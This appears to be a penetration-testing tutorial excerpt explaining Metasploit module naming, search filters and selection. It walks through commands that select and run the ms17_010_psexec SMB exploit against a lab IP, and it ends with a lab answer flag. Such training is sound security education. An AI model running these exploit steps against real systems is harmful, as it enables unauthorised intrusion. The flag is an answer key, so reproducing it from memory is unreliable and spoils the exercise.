As we mentioned previously, Metasploit `modules` are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. The `exploit` category consists of so-called proof-of-concept (`POCs`) that can be used to exploit existing vulnerabilities in a largely automated manner.

#### Syntax
```shell-session
<No.> <type>/<os>/<service>/<name>
```

#### Example
```shell-session
794   exploit/windows/ftp/scriptftp_list
```

#### Index No.
The `No.` tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the `No.` tag can be to select specific Metasploit modules later.

#### Type
The `Type` tag is the first level of segregation between the Metasploit `modules`. Looking at this field, we can tell what the piece of code for this module will accomplish.

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|

#### OS
The `OS` tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

#### Service
The `Service` tag refers to the vulnerable service that is running on the target machine. For some modules, such as the `auxiliary` or `post` ones, this tag can refer to a more general activity such as `gather`, referring to the gathering of credentials, for example.

#### Name
Finally, the `Name` tag explains the actual action that can be performed using this module created for a specific purpose.

## Searching for Modules

#### MSF - Search Function
```shell-session
msf6 > help search
```

#### MSF - Searching for EternalRomance (Exemple)
```shell-session
msf6 > search eternalromance
```

```shell-session
msf6 > search eternalromance type:exploit
```

We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (`cve:<year>`), the platform Windows (`platform:<os>`), the type of module we want to find (`type:<auxiliary/exploit/post>`), the reliability rank (`rank:<rank>`), and the search name (`<pattern>`). This would reduce our results to only those that match all of the above.
#### MSF - Specific Search
```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## Module Selection

```shell-session
msf6 > search ms17_010
...

msf6 > use <no.>
```

#### MSF - Module Information
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

#### MSF - Target Specification
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```
In addition, there is the option `setg`, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.

#### MSF - Permanent Target Specification
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```

#### MSF - Exploit Execution
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

### Questions

Same exploit as above: `HTB{MSF-W1nD0w5-3xPL01t4t10n}`
